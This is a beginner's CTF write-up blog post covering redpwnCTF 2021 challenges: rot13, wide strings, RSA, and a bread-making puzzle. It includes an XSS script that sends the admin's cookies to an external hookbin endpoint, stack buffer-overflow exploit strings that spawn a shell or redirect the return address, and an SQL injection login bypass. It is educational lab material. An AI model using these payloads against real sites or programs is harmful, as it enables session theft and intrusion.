[meta]: <title> (redpwnCTF 2021)
[meta]: <subtitle> (A noob's perspective)
[meta]: <author> (Loek)
[meta]: <date> (July 13 2021)
[meta]: <tags> (hacking, CTF, writeup)
[meta]: <cover> (/img/redpwn2021.png)

This is the first 'real' CTF I've participated in. About two weeks ago, a
friend of mine was stuck on some challenges from the Radboud CTF. This was a
closed CTF more geared towards beginners (high school students), and only had a
few challenges which required deeper technical knowledge of web servers and
programming. Willem solved most of the challenges, and I helped solve 3 more.

Apart from those challenges, basically all my hacking knowledge comes from
computerphile videos, liveoverflow videos and making applications myself.

## Challenges

### web/pastebin-1

This challenge is a simple XSS exploit. The website that's vulnerable is
supposed to be a clone of pastebin. I can enter any text into the paste area,
and it will get inserted as HTML code into the website when someone visits the
generated link.

The challenge has two sites: one with the pastebin clone, and one that visits
any pastebin url as the website administrator. The goal of this challenge is
given by it's description:

> Ah, the classic pastebin. Can you get the admin's cookies?

In JS, you can read all cookies without the `HttpOnly` attribute by reading
`document.cookie`. This allows us to read the cookies from the admin's browser,
but now we have to figure out a way to get them sent back to us.

Luckily, there's a free service called [hookbin](https://hookbin.com/) that
gives you an http endpoint to send anything to, and look at the request
details.

Combining these two a simple paste can be created:

```html
<script>
	var post = new XMLHttpRequest();
	post.open("post", "https://hookb.in/<endpoint url>");
	post.send(document.cookie);
</script>
```

### crypto/scissor

I wasn't planning on including this one, but it makes use of the excellent
[CyberChef](https://gchq.github.io/CyberChef/) tool. The flag is given in the
challenge description, and is encrypted using a ceasar/rot13 cipher. A simple
python implementation of this cipher is included with the challenge, but I just
put it into CyberChef and started trying different offsets.

### rev/wstrings

> Some strings are wider than normal...

This challenge has a binary that uses a simple `strcmp` to check the flag. When
running the program, the following output is visible:

```sh
# ./wstrings
Welcome to flag checker 1.0.
Give me a flag>
```

My first stategy was running the `strings` utility on the `wstrings` binary,
but I didn't find the flag. What was interesting to me though was that I also
couldn't find the prompt text... This immediately made me check for other
string encodings.

Running the `strings` utility with the `-eL` flag tells `strings` to look for
32-bit little-endian encoded strings, and lo and behold the flag shows up!

This is because ascii strings are less 'wide' than 32-bit strings:

```
          --- ascii ---

hex -> 0x68 0x65 0x6c 0x6c 0x6f
str -> h    e    l    l    o
```

Notice how each character is represented by a single byte each (8 bits) in
ascii, as opposed to 32-bit characters in 32-bit land.

```
        --- 32-bit land ---

hex -> 0x00000068 0x00000065 0x0000006c 0x0000006c 0x0000006f
str -> h          e          l          l          o
```

I think 32-bit strings also have practical use for things like non-English
texts such as Hebrew, Chinese or Japanese. Those characters take up more space
anyways, and you would waste less space by not using unicode escape characters.

### web/secure

> Just learned about encryption—now, my website is unhackable!

This challenge is pretty simple if you know some of JS's quirks. Right at the
top of the file is an sqlite3 expression in JS:

```js
////////
db.exec(`INSERT INTO users (username, password) VALUES (
    '${btoa('admin')}',
    '${btoa(crypto.randomUUID)}'
)`);
```

This section of code immediately jumped out to me because I noticed that
`crypto.randomUUID` wasn't actually being called.

Because the 'random uuid' is being fed into `btoa()` it becomes a base64
encoded string. However, `btoa()` also expects a string as input. Because every
object in JS has a `.toString()` method, when you pass it into a function
expecting another type, JS will happily convert it for you without warning.

This means that the admin's password will always be a base64-encoded version of
`crypto.randomUUID`'s source code. We can get that base64-encoded source code
by running the following in a NodeJS REPL:

```js
// import file system and crypto modules
var writeFileSync = require('fs').writeFileSync;
var crypto = require('crypto');

// write source to file
writeFileSync('./randomUUID.js', btoa(crypto.randomUUID.toString()), 'utf-8');
```

I made a simple shell script that calls cURL with the base64-encoded
parameters, and decodes the url-encoded flag afterwards:

```sh
#!/bin/sh

# https://stackoverflow.com/questions/6250698/how-to-decode-url-encoded-string-in-shell
function urldecode() { : "${*//+/ }"; echo -e "${_//%/\\x}"; }

urldecode $(curl -sX POST \
	-d "username=$(printf 'admin' | base64)" \
	-d "password=$(cat ./randomUUID.js)" \
	https://secure.mc.ax/login)
```

### crypto/baby

> I want to do an RSA!

This challenge is breaking RSA. It only works because the `n` parameter is
really small.

Googling for 'rsa decrypt n e c' yields
[this](https://stackoverflow.com/questions/49878381/rsa-decryption-using-only-n-e-and-c)
stackoverflow result, which links to
[dcode.fr](https://www.dcode.fr/rsa-cipher). The only thing left to do is
calculate `p` and `q`, which can be done using [wolfram
alpha](https://wolframalpha.com/).

### pwn/beginner-generic-pwn-number-0

> rob keeps making me write beginner pwn! i'll show him...
>
> `nc mc.ax 31199`

This was my first interaction with `gdb`. It was.. painful. After begging for
help in the redpwnCTF discord server about another waaaay harder challenge, an
organizer named asphyxia pointed me towards [gef](https://github.com/hugsy/gef)
which single-handedly saved my sanity during the binary exploitation
challenges.

The first thing I did was use [iaito](https://github.com/radareorg/iaito) to
look at a disassembly graph of the binary. Iaito is a graphical front-end to
the radare2 reverse engineering framework, and I didn't feel like learning two
things at the same time, so that's why I used it. While it's very
user-friendly, I didn't look into reverse engineering tools very much, and
didn't realise that iaito is still in development. Let's just say I ran into
some issues with project saving so I took lots of unnecessary repeated steps.

After trying to make sense of assembly code after just seeing it for the first
time, I instead decided looking at the source code would be a better idea since
I actually know c.

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

const char *inspirational_messages[] = {
  "\"𝘭𝘦𝘵𝘴 𝘣𝘳𝘦𝘢𝘬 𝘵𝘩𝘦 𝘵𝘳𝘢𝘥𝘪𝘵𝘪𝘰𝘯 𝘰𝘧 𝘭𝘢𝘴𝘵 𝘮𝘪𝘯𝘶𝘵𝘦 𝘤𝘩𝘢𝘭𝘭 𝘸𝘳𝘪𝘵𝘪𝘯𝘨\"",
  "\"𝘱𝘭𝘦𝘢𝘴𝘦 𝘸𝘳𝘪𝘵𝘦 𝘢 𝘱𝘸𝘯 𝘴𝘰𝘮𝘦𝘵𝘪𝘮𝘦 𝘵𝘩𝘪𝘴 𝘸𝘦𝘦𝘬\"",
  "\"𝘮𝘰𝘳𝘦 𝘵𝘩𝘢𝘯 1 𝘸𝘦𝘦𝘬 𝘣𝘦𝘧𝘰𝘳𝘦 𝘵𝘩𝘦 𝘤𝘰𝘮𝘱𝘦𝘵𝘪𝘵𝘪𝘰𝘯\"",
};

int main(void)
{
  srand(time(0));
  long inspirational_message_index = rand() % (sizeof(inspirational_messages) / sizeof(char *));
  char heartfelt_message[32];
  
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts(inspirational_messages[inspirational_message_index]);
  puts("rob inc has had some serious layoffs lately and i have to do all the beginner pwn all my self!");
  puts("can you write me a heartfelt message to cheer me up? :(");

  gets(heartfelt_message);

  if(inspirational_message_index == -1) {
    system("/bin/sh");
  }
}
```

After looking at this source things became a lot clearer, because the only
input you can actually control is received from `gets(...);`

Now comes the hard part: doing it, but in assembly!

Some resources you should consume before attempting binary exploitation would
be [computerphile's video on buffer
overflows](https://www.youtube.com/watch?v=1S0aBV-Waeo) and
[cheat.sh/gdb](https://cheat.sh/gdb) for some basic gdb commands. The rest of
this section assumes you know the basics of both buffer overflows and gdb.

First, let's print a disassembly of the `int main()` function:

```
(gdb) disas main
Dump of assembler code for function main:
   0x000000000040127c <+134>:   call   0x4010a0 <puts@plt>
   0x0000000000401281 <+139>:   lea    rdi,[rip+0xec8]        # 0x402150
   0x0000000000401288 <+146>:   call   0x4010a0 <puts@plt>
   0x000000000040128d <+151>:   lea    rdi,[rip+0xf1c]        # 0x4021b0
   0x0000000000401294 <+158>:   call   0x4010a0 <puts@plt>
   0x0000000000401299 <+163>:   lea    rax,[rbp-0x30]
   0x000000000040129d <+167>:   mov    rdi,rax
   0x00000000004012a0 <+170>:   call   0x4010f0 <gets@plt>
   0x00000000004012a5 <+175>:   cmp    QWORD PTR [rbp-0x8],0xffffffffffffffff
   0x00000000004012aa <+180>:   jne    0x4012b8 <main+194>
   0x00000000004012ac <+182>:   lea    rdi,[rip+0xf35]        # 0x4021e8
   0x00000000004012b3 <+189>:   call   0x4010c0 <system@plt>
   0x00000000004012b8 <+194>:   mov    eax,0x0
   0x00000000004012bd <+199>:   leave
   0x00000000004012be <+200>:   ret
End of assembler dump.
```

This isn't the full output from gdb, but only the last few lines. A few things
should immediately stand out: the 3 `<puts@plt>` calls, and right after the
call to `<gets@plt>`. These are the assembly equivalent of:

```c
puts(inspirational_messages[inspirational_message_index]);
puts("rob inc has had some serious layoffs lately and i have to do all the beginner pwn all my self!");
puts("can you write me a heartfelt message to cheer me up? :(");

gets(heartfelt_message);
```

Since I didn't see any reference to a flag file being read, I assumed that the
`system("/bin/sh")` call is our main target, so let's see if we can find that
in our assembly code. There's a call to `<system@plt>` at `<main+189>`, and
there's other weird `cmp`, `jne` and `lea` instructions before. Let's figure
out what those do!

After some stackoverflow soul searching, I found out that the `cmp` and `jne`
are assembly instructions for compare, and jump-if-not-equal. They work like
this:

```asm6502
;  cmp compares what's in the $rbp register to 0xffffffffffffffff
;  and turns on the ZERO flag if they're equal
   0x004012a5 <+0>:  cmp    QWORD PTR [rbp-0x8],0xffffffffffffffff
   
;  jne checks if the ZERO flag is on,
;  and if it is it jumps (in this case) to 0x4012b8
┌--0x004012aa <+1>:  jne    0x4012b8 <main+194>
│; we can safely ignore the `lea` instruction as it doesn't impact our pwn
│  0x004012ac <+2>:  lea    rdi,[rip+0xf35]        # 0x4021e8
│
│; the almighty syscall
│  0x004012b3 <+3>:  call   0x4010c0 <system@plt>
│
│; from here on the program exits without calling /bin/sh
└->0x004012b8 <+4>:  mov    eax,0x0
   0x004012bd <+5>:  leave
   0x004012be <+6>:  ret
```

The program checks if there's `0xffffffffffffffff` in memory `0x8` bytes before
the `$rbp` register. The program allocates 32 bytes of memory for our heartfelt
message, but it continues reading even if our heartfelt message is longer than
32 bytes. Let's see if we can overwrite that register >:)

Let's set a breakpoint after the `<gets@plt>` call in gdb, and run the program
with 40 bytes of `0x61` ('a')

```
(gdb) break *0x00000000004012a5
Breakpoint 1 at 0x4012a5

(gdb) run < <(python3 -c "print('a' * 40)")
```

I'm using the `run` command with `<` and `<()` to pipe the output of python
into the program's `stdin`. It's unnecessary at this stage because there's an
'a' key on my keyboard, but if we were to send raw bytes, this would make it a
lot easier.

I'm also using [gef](https://github.com/hugsy/gef) so I get access to a command
called `context` which prints all sorts of information about registers, the
stack and a small disassembly window. I won't show it's output here, but it
was an indispensable tool that you should install nonetheless.

Let's print the memory at `[$rbp - 0x8]`:

```
(gdb) x/8gx $rbp - 0x8
0x7fffffffd758:  0x0000000000000000 0x0000000000000000
0x7fffffffd768:  0x00007ffff7de4b25 0x00007fffffffd858
0x7fffffffd778:  0x0000000100000064 0x00000000004011f6
0x7fffffffd788:  0x0000000000001000 0x00000000004012c0
```

Hmmm, no overwriteage yet. Let's try 56 bytes instead:

```
(gdb) run < <(python3 -c "print('a' * 56)")
(gdb) x/8gx $rbp - 0x8
0x7fffffffd758:  0x6161616161616161 0x6161616161616161
0x7fffffffd768:  0x00007ffff7de4b00 0x00007fffffffd858
0x7fffffffd778:  0x0000000100000064 0x00000000004011f6
0x7fffffffd788:  0x0000000000001000 0x00000000004012c0
(gdb) x/1gx $rbp - 0x8
0x7fffffffd758: 0x6161616161616161
```

Jackpot! We've overwritten 16 bytes of the address that the `cmp` instruction
reads. Let's try setting it to `0xff` instead, so we get a shell. Python 3 is
not that great for binary exploitation, so the code for this is a little bit
ugly, but if it works, it works!

```
(gdb) run < <(python3 -c "import sys; sys.stdout.buffer.write(b'a' * 40 + b'\xff' * 8)")
(gdb) x/1gx $rbp - 0x8
0x7fffffffd758: 0xffffffffffffffff
```

Now let's let execution continue as normal by using the `continue` command:

```
(gdb) continue
Continuing.
[Detaching after vfork from child process 22950]
[Inferior 1 (process 22947) exited normally]
```

This might seem underwhelming, but our explit works! A child process was
spawned, and as a bonus, we didn't get any segmentation faults! The reason we
don't get an interactive shell is because we used python to pipe input into the
program which makes it non-interactive.

At this point I was about 12 hours in of straight gdb hell, and I was very
happy to see this shell. After discovering this, I immediately tried it outside
the debugger and was dissapointed to see that my exploit didn't work. After a
small panick attack I found out this was because of my environment variables.
You can launch an environment-less shell by using the `env -i sh` command:

```
λ generic → λ git master* → env -i sh
sh-5.1$ python3 -c "import sys; sys.stdout.buffer.write(b'a' * 40 + b'\xff' * 8)" | ./beginner-generic-pwn-number-0
"𝘭𝘦𝘵𝘴 𝘣𝘳𝘦𝘢𝘬 𝘵𝘩𝘦 𝘵𝘳𝘢𝘥𝘪𝘵𝘪𝘰𝘯 𝘰𝘧 𝘭𝘢𝘴𝘵 𝘮𝘪𝘯𝘶𝘵𝘦 𝘤𝘩𝘢𝘭𝘭 𝘸𝘳𝘪𝘵𝘪𝘯𝘨"
rob inc has had some serious layoffs lately and i have to do all the beginner pwn all my self!
can you write me a heartfelt message to cheer me up? :(
sh-5.1$ # another shell :tada:
```

Now it was time to actually do the exploit on the remote server.

I whipped up the most disgusting and janky python code that I won't go into
detail about, but here's what is does (in short):

1. Create a thread to capture data from the server and forward it to `stdout`
2. Capture user commands using `input()` and decide what to do with them on the main thread

The code for this script can be found
[here](https://github.com/lonkaars/redpwn/blob/master/challenges/generic/pwn.py),
though be warned, it's _very_ janky and you're probably better off copying
stuff from stackoverflow. Writing your own tools is more fun though, and might
also be faster than trying to wrestle with existing tools to try to get them to
do exactly what you want them to do. In this case I could've also just used [a
simple
command](https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection?noredirect=1&lq=1).

It did help me though and I actually had to copy it for use in the other buffer
overflow challenge that I solved, so I'll probably refactor it someday for use
in other CTFs.

### crypto/round-the-bases

This crypto challenge uses a text file with some hidden information. If you
open up the file in a text editor, and adjust your window width, you'll
eventually see the repeating pattern line up. This makes it very easy to see
what part of the pattern is actually changing:

```
----------------------xxxx----
[9km7D9mTfc:..Zt9mTZ_:K0o09mTN
[9km7D9mTfc:..Zt9mTZ_:K0o09mTN
[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN
[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN
[9km7D9mTfc:..Zt9mTZ_:K0o09mTN
[9km7D9mTfc:..Zt9mTZ_:K0o09mTN
[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN
[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN
[9km7D9mTfc:..Zt9mTZ_:K0o09mTN
[9km7D9mTfc:..Zt9mTZ_:K0o09mTN
[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN
[9km7D9mTfc:..Zt9mTZ_:K0o09mTN
[9km7D9mTfc:..Zt9mTZ_:K0o09mTN
[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN
[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN
```

I wrote a simple python script to parse this into binary data, and it worked on
the first try:

```py
# read the file into a string
file = open("./round-the-bases")
content = file.read()
file.close()

# split on every 30th character into a list
n = 30
arr = [ content[i : i + n] for i in range(0, len(content), n) ]

bin = []
for line in arr:
  sub = line[16:20] # the part that changes
  if sub == 'IIcu': # IIcu -> 0x0
    bin.append('0')
  else: #             K0o0 -> 0x1
    bin.append('1')

bin = ''.join(bin) # join all the list indices together into a string

# decode the binary string into ascii characters
for i in range(0, len(bin), 8):
  print(chr(int(bin[i:i+8], 2)), end='')

# newline for good measure
print("\n", end='')
```

### pwn/ret2generic-flag-reader

This was the second binary exploitation challenge I tackled, and it went much
better than the first because I (sort of) knew what I was doing by now.

I figured the 'ret2' part of the title challenge was short for 'return to', and
my suspicion was confirmed after looking at the c source:

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void super_generic_flag_reading_function_please_ret_to_me()
{
  char flag[0x100] = {0};
  FILE *fp = fopen("./flag.txt", "r");
  if (!fp)
  {
    puts("no flag!! contact a member of rob inc");
    exit(-1);
  }
  fgets(flag, 0xff, fp);
  puts(flag);
  fclose(fp);
}

int main(void)
{
  char comments_and_concerns[32];

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...");
  puts("how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!");
  puts("slap on some flavortext and there's no way rob will fire me now!");
  puts("this is genius!! what do you think?");

  gets(comments_and_concerns);
}

```

With my newfound knowledge of binary exploitation, I figured I would have to
overwrite the return pointer on the stack somehow, so the program calls the
`super_generic_flag_reading_function_please_ret_to_me` function that isn't
called at all in the original.

The only input we have control over is again a call to `gets();`

Let's look at the disassembly in gdb:

```
(gdb) disas main
Dump of assembler code for function main:
   0x00000000004013f4 <+79>:    call   0x4010a0 <puts@plt>
   0x00000000004013f9 <+84>:    lea    rdi,[rip+0xca0]        # 0x4020a0
   0x0000000000401400 <+91>:    call   0x4010a0 <puts@plt>
   0x0000000000401405 <+96>:    lea    rdi,[rip+0xd0c]        # 0x402118
   0x000000000040140c <+103>:   call   0x4010a0 <puts@plt>
   0x0000000000401411 <+108>:   lea    rdi,[rip+0xd48]        # 0x402160
   0x0000000000401418 <+115>:   call   0x4010a0 <puts@plt>
   0x000000000040141d <+120>:   lea    rax,[rbp-0x20]
   0x0000000000401421 <+124>:   mov    rdi,rax
   0x0000000000401424 <+127>:   call   0x4010e0 <gets@plt>
   0x0000000000401429 <+132>:   mov    eax,0x0
   0x000000000040142e <+137>:   leave
   0x000000000040142f <+138>:   ret
End of assembler dump.
```

We see again multiple calls to `<puts@plt>` and right after a call to
`<gets@plt>`. There is no `cmp` and `jne` to be found in this challenge though.

The goal is to overwrite the _return address_. This is a memory address also
stored in memory, and the program will move execution to that memory address
once it sees a `ret` instruction. In this 'vanilla' state, the return address
always goes to the assembly equivalent of an `exit()` function. Let's see if we
can overwrite it by giving too much input:

```
(gdb) break *0x000000000040142f
Breakpoint 1 at 0x40142f
(gdb) run < <(python3 -c "print('a' * 56)")
-- Breakpoint 1 hit --
(gdb) info registers
rax            0x0                 0x0
rbx            0x401430            0x401430
rsi            0x7ffff7f7d883      0x7ffff7f7d883
rdi            0x7ffff7f804e0      0x7ffff7f804e0
rbp            0x6161616161616161  0x6161616161616161
rsp            0x7fffffffd898      0x7fffffffd898
rip            0x40142f            0x40142f <main+138>
```

As you can see, the $rbp register is completely overwritten with `0x61`'s.
Let's check the $rsp register to see where the `main()` function tries to go
after `ret`:

```
(gdb) run
Starting program: ret2generic-flag-reader
alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
slap on some flavortext and there's no way rob will fire me now!
this is genius!! what do you think?
a0a1a2a3a4a5a6a7a8a9b0b1b2b3b4b5b6b7b8b9c0c1c2c3
-- Breakpoint 1 hit --
(gdb) x/1gx $rsp
0x7fffffffd898: 0x3363326331633063
```

Let's use CyberChef to see what `0x3363326331633063` is in ascii!

![](/img/redpwn2021/cyberchef1.png)

Hmm, it's backwards. Let's reverse it!

![](/img/redpwn2021/cyberchef2.png)

Let's find the address of the super generic flag reading function with gdb.

```
(gdb) print super_generic_flag_reading_function_please_ret_to_me
$2 = {<text variable, no debug info>} 0x4011f6 <super_generic_flag_reading_function_please_ret_to_me>
```

Now we're ready to craft a string that exploits the program and runs the secret
function!

```
a0a1a2a3a4a5a6a7a8a9b0b1b2b3b4b5b6b7b8b9c0c1c2c3 <- original
                                        c0c1c2c3 <- ends up in $rsp
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa         <- padding ( 0x28 * 'a' )

  c 0 c 1 c 2 c 3  <- ends up in $rsp
  3 c 2 c 1 c 0 c  <- reverse
0x3363326331633063 <- reverse (hex)
0x00000000004011f6 <- pointer we want in $rsp
  f611400000000000 <- reverse
  \xf6\x11\x40\x00\x00\x00\x00\x00 <- python bytestring

exploit string:
b'a' * 0x28 + b'\xf6\x11\x40\x00\x00\x00\x00\x00'
```

Now let's try it in an environment-less shell:

```
python3 -c "import sys; sys.stdout.buffer.write(b'a' * 0x28 + b'\xf6\x11\x40\x00\x00\x00\x00\x00')" | ./ret2generic-flag-reader
alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
slap on some flavortext and there's no way rob will fire me now!
this is genius!! what do you think?
flag{this_is_a_dummy_flag_go_solve_it_yourself}

Segmentation fault (core dumped)
sh-5.1$
```

### rev/bread-making

For this challenge, I first tried using iaito again to do some program flow
analysis. After giving up on that, I decided to instead brute-force the correct
steps by hand. This was a very long and boring process.

First I used `strings` again to extract all the dialogue and user input strings
from the binary. Then I filtered them to not include obvious dialogue, but only
the possible user input strings. And this is the correct path that gives the
flag:

```
add flour
add salt
add yeast
add water
hide the bowl inside a box
wait 3 hours
work in the basement
preheat the toaster oven
set a timer on your phone
watch the bread bake
pull the tray out with a towel
open the window
unplug the oven
unplug the fire alarm
wash the sink
clean the counters
flush the bread down the toilet
get ready to sleep
close the window
replace the fire alarm
brush teeth and go to bed
```

In hindsight I could've probably made a simple python script to brute force all
remaining possibilities until it got longer output from the program, but
laziness took over and I decided that spending 45 minutes doing very dull work
was more worth it instead.

### Willem's part in the CTF

Hi, Willem here.
In this part I will talk about my experience during the CTF and The
collaboration between me and Loek.

This was also my first CTF, just like Loek, because of this was quite
uncertain about my skill level. For example, I have no experience using Linux
systems, but from what I learned before the CTF it is quite essential. My fear of
not being able to do any off the challenge disappear quickly after we had completely 
the beginner challenges.
With a simple sql injection I got my first real flag.
```
username: admin';--
password:
flag{sqli_overused_again_0b4f6}
```

We had planned to use github's projects to track progress on challenges, but
when you're actually doing a challenge it's the last thing you think about.
So, we didn't really know who was doing which challenge, but because we're a
team of two this wasn't a big problem.

The most challenge were a bit to hard for me. Some I would get pretty far, but needed
Loek's help to solve it. Others I didn't even attempt to begin on.

One challenge I spend a lot of time on was __The substitution game__.
In the substitution game you had to substitute certain parts of the input string
to get the desired output string. I got to level for of 6.
level 1 and 2 to were really simple, but at level 3 you started to need to 
really understand the game.
```
level 3:
initial: aaaaaaaaaaaaaa (the amount of a's varied)
target: a
```
The solution is really simple, but it's pretty hard to get to it.
You want to remove 'a's so I started with ```a => ``` , this turn all 'a's
to None and left you with an empty string. The problem is you can't substitute anything in 
an empty string. The solution was ```aa => a```, this removed an 'a' every time 
the initial string got checked. To get this solution you had to realize,
that the program would always substitute the first instance it would come 
across, and the program was set to do way more than needed substitutions.
This would come handy in the next level.
```
level 4:
initial: ggggggggggg (the amount of g's varied)
target: ginkoid
```
After completing level 3 this level looks very easy, just substitute the g's
like before ```gg => g``` and turn the last g into ginkoid ```g => ginkoid```
, but this didn't work because of the way the program worked, after getting to a
valid solution I didn't stop and the single g in ginkoid would also change to
ginkoid. You would get infinite ginkoid.
The solution was:
```gg => ginkoid; ginkoidginkoid => ginkoid; ginkoidg => ginkoid```
I began with noticing you couldn't just change the g, because that would also
change the g in ginkoid. so double gg becomes ginkoid. We have to use the same
trick as in level 3 to gain only one ginkoid ```ginkoidginkoid => ginkoid```
because of the way we changed the single g's to ginkoid it would only work
with an even amount of g's. In the case there was an uneven amount of g's
we would be left with ginkoidg, so we remove it ```ginkoidg => ginkoid```.

I found this challenge really enjoyable and during this challenge I noticed
that I most enjoy the puzzle aspect of computer science, puzzling for hours
to fix a bug and then finally finding a solution.

I didn't complete many challenges and wasn't really able to help Loek, but
I really enjoyed the CTF. It's a really fun way to test your skills and 
knowledge. In the end I'm really happy with the score we (mostly Loek) got
and I think I’ll take part in other CTFs in the future.


## Epilogue

Of the 47 total challenges, me and Willem only solved 15. My end goal for this
CTF wasn't winning to begin with, so the outcome didn't matter for me. After
the second day I set the goal of reaching the 3rd page of the leaderboards as
my goal, and we reached 277'th place in the end which made my mom very proud!

![](/img/redpwn2021/leaderboard.png)

I enjoyed the CTF a lot! There were some very frustrating challenges, and I
still don't get how people solved web/wtjs, but that's fine. I did learn how to
use GDB and a lot of other things during the CTF which were all very rewarding.
I will definitely be participating in the 2022 redpwnCTF, and maybe even some
others if they're beginner friendly :)

During the Radboud CTF and this CTF I've accumulated a lot of ideas to maybe
host one myself, though I have no clue where to start with that. Maybe keep an
eye out for that ;)

